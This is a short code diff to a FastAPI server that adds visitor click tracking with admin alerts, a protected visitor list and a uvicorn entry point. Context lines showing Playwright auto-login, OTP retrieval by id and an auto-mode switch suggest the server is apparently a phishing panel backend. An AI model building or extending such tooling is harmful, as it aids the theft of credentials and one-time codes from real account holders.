@@ -25,6 +25,7 @@ from utils import messageAdmin, CONFIG, logger, DEBUG
 from modules.auto_login_playwright import auto_login
 import threading
 from queue import Queue
+import uvicorn
 import base64
 
 AUTO_MODE = False
@@ -277,6 +278,33 @@ def set_action(
     return set_action_abstracted(id, action)
 
 
+@app.put("/visit/{id}")
+def set_visitor(
+    id: str,
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    crud.set_visitor(db, id)
+    admin_message = f"----\n click from: \n id: {id} \n----"
+
+    messageadmin_thread = threading.Thread(target=messageAdmin, args=(admin_message,))
+    messageadmin_thread.start()
+    return {"Status": "Done"}
+
+
+@app.get("/visitors", dependencies=[Depends(get_api_key)])
+def get_visitors(
+    request: Request,
+    db: Session = Depends(get_db),
+):
+    db_visitors = crud.get_visitors(db)
+    if not db_visitors:
+        return ""
+
+    # return only with
+    return db_visitors
+
+
 @app.get("/OTP/{id}")
 def get_OTP(
     id: int,
@@ -350,3 +378,7 @@ def set_automode(mode: str, request: Request, db: Session = Depends(get_db)):
 @app.get("/automode", dependencies=[Depends(get_api_key)])
 def get_automode(request: Request, db: Session = Depends(get_db)):
     return json.dumps({"automode": str(AUTO_MODE)})
+
+
+if __name__ == "__main__":
+    uvicorn.run(app, host="0.0.0.0", port=8000)
